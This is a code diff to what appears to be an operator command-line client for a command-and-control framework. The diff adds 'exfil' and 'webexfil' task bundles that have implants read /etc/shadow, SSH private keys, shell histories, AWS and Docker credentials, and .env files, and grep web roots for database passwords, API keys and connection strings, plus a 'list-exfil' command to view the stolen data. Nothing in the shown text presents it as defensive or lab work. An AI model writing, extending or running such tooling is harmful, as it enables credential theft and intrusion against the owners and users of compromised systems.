@@ -77,6 +77,35 @@ BUNDLES: dict[str, list[dict]] = {
     "ping": [
         {"title": "Ping implant", "task_type": "ping"},
     ],
+    "exfil": [
+        {"title": "Read /etc/passwd",        "task_type": "execute", "command": "cat /etc/passwd"},
+        {"title": "Read /etc/shadow",        "task_type": "execute", "command": "cat /etc/shadow"},
+        {"title": "Read /etc/hosts",         "task_type": "execute", "command": "cat /etc/hosts"},
+        {"title": "SSH private keys",        "task_type": "execute", "command": "find ~/.ssh -type f -name 'id_*' ! -name '*.pub' -exec cat {} +"},
+        {"title": "SSH authorized keys",     "task_type": "execute", "command": "cat ~/.ssh/authorized_keys 2>/dev/null"},
+        {"title": "Known hosts",             "task_type": "execute", "command": "cat ~/.ssh/known_hosts 2>/dev/null"},
+        {"title": "Bash history",            "task_type": "execute", "command": "cat ~/.bash_history"},
+        {"title": "Zsh history",             "task_type": "execute", "command": "cat ~/.zsh_history 2>/dev/null"},
+        {"title": "Shell config files",      "task_type": "execute", "command": "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null"},
+        {"title": "AWS credentials",         "task_type": "execute", "command": "cat ~/.aws/credentials 2>/dev/null"},
+        {"title": "AWS config",              "task_type": "execute", "command": "cat ~/.aws/config 2>/dev/null"},
+        {"title": "Docker config",           "task_type": "execute", "command": "cat ~/.docker/config.json 2>/dev/null"},
+        {"title": "Git config",              "task_type": "execute", "command": "cat ~/.gitconfig 2>/dev/null"},
+        {"title": "Find .env files",         "task_type": "execute", "command": "find / -name '.env' -not -path '*/proc/*' 2>/dev/null -exec cat {} +"},
+        {"title": "Find private keys",       "task_type": "execute", "command": "find / -name '*.pem' -o -name '*.key' -o -name '*.p12' 2>/dev/null | grep -v proc"},
+        {"title": "Sudo rights",             "task_type": "execute", "command": "sudo -l 2>/dev/null"},
+        {"title": "Recently modified files", "task_type": "execute", "command": "find /home /etc /var/www -type f -mtime -7 2>/dev/null"},
+    ],
+    "webexfil": [
+        {"title": "Find web roots",          "task_type": "execute", "command": "find /var/www /srv /opt -maxdepth 3 -type d 2>/dev/null"},
+        {"title": "Nginx config",            "task_type": "execute", "command": "cat /etc/nginx/nginx.conf 2>/dev/null; ls /etc/nginx/sites-enabled/ 2>/dev/null"},
+        {"title": "Apache config",           "task_type": "execute", "command": "cat /etc/apache2/apache2.conf 2>/dev/null; ls /etc/apache2/sites-enabled/ 2>/dev/null"},
+        {"title": "Find DB credentials",     "task_type": "execute", "command": "grep -r 'DB_PASS\\|DB_PASSWORD\\|database_password' /var/www /opt /srv 2>/dev/null"},
+        {"title": "Find API keys",           "task_type": "execute", "command": "grep -r 'API_KEY\\|SECRET_KEY\\|ACCESS_TOKEN' /var/www /opt /srv 2>/dev/null"},
+        {"title": "Find connection strings", "task_type": "execute", "command": "grep -r 'mongodb://\\|mysql://\\|postgres://\\|redis://' /var/www /opt /srv 2>/dev/null"},
+        {"title": "PHP config files",        "task_type": "execute", "command": "find /var/www -name 'config.php' -o -name 'wp-config.php' -o -name 'settings.php' 2>/dev/null -exec cat {} +"},
+        {"title": "App .env files",          "task_type": "execute", "command": "find /var/www /opt /srv -name '.env' 2>/dev/null -exec cat {} +"},
+    ],
 }
 
 
@@ -135,7 +164,7 @@ BANNER = r"""
  ██║     ██╔═══╝     ██║     ██║     ██║
  ╚██████╗███████╗    ╚██████╗███████╗██║
   ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
-   Operator CLI  ·  struts2-rce
+   Operator CLI  ·  AMJA
 """
 
 HELP_TEXT = f"""
@@ -187,6 +216,7 @@ class LPClient:
     def list_tasks(self):   return self._get("/tasks")
     def list_results(self): return self._get("/results")
     def list_history(self): return self._get("/history")
+    def list_exfil(self):   return self._get("/exfil")
 
     def submit_bundle(self, bundle_name: str) -> list:
         # Submit multiple tasks sequentially
@@ -199,7 +229,7 @@ class LPClient:
         return responses
 
 
-REPL_COMMANDS = ["list-tasks", "list-results", "list-history",
+REPL_COMMANDS = ["list-tasks", "list-results", "list-history", "list-exfil",
                  "addtask", "bundles", "help", "exit", "quit",
                  *BUNDLES.keys()]
 
@@ -264,6 +294,13 @@ def run_repl(client: LPClient):
                 else:
                     ok(f"{len(data)} record(s)")
                     pretty(data, "History")
+
+            elif cmd == "list-exfil":
+                data = client.list_exfil()
+                if not data: warn("No exfil data received yet.")
+                else:
+                    ok(f"{len(data)} exfil record(s)")
+                    pretty(data, "Exfil")
 
             elif cmd == "addtask":
                 if not args:
